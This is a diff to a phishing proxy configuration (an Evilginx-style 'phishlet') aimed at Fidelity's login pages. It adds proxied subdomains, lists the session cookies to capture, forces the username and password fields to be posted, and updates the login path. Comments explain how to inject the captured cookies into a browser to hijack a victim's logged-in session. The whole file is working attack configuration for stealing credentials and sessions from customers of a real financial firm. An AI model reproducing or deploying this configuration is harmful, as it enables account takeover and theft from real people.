@@ -15,6 +15,7 @@ proxy_hosts:
   - {phish_sub: 'clix', orig_sub: 'clix', domain: 'fidelity.com', session: true, is_landing: false}
   - {phish_sub: 'servicemessages', orig_sub: 'servicemessages', domain: 'fidelity.com', session: true, is_landing: false}
   - {phish_sub: 'scs', orig_sub: 'scs', domain: 'fidelity.com', session: true, auto_filter: true, is_landing: false}
+  - {phish_sub: 'ecaap', orig_sub: 'ecaap', domain: 'fidelity.com', session: true, is_landing: false}
 
 
 sub_filters:
@@ -78,7 +79,8 @@ auth_tokens:
     keys: ['akaalb_assets_ALB', '.*,regexp']
   - domain: 'oltx.fidelity.com'
     keys: ['JSESSIONID', 'akaalb_oltx_ALB', '.*,regexp']
-
+  - domain: 'ecaap.fidelity.com'
+    keys: ['SESSION_SCTX', 'ET', 'MC', '.*,regexp']
 # Use `EditThisCookie` in chrome and `EditThisCookie2` in firefox to successfully inject the cookies. 
 # After injecting cookies manually
 # Go to this url to get the session (Sessions have a some specific time , after that they get timeout and you won't be able to login)
@@ -105,13 +107,16 @@ credentials:
     type: 'post'
 
 force_post:
-  - path: '/ftgw/Fas/Fidelity/RtlCust/Login/Response/dj.chf.ra'
+  - path: '/user/factor/password/authentication'
     force:
-      - {key: 'SavedIdInd', value: 'Y'}
+      - {key: 'username', value: '{input}'}
+      - {key: 'password', value: '{input}'}
     type: 'post'
+
     
 login:
-  domain: 'www.fidelity.com'
-  path: '/'
+  domain: 'digital.fidelity.com'
+  path: '/prgw/digital/login/full-page'
+
 #  domain: 'login.fidelity.com'
 #  path: '/ftgw/Fidelity/RtlCust/Login/Init'
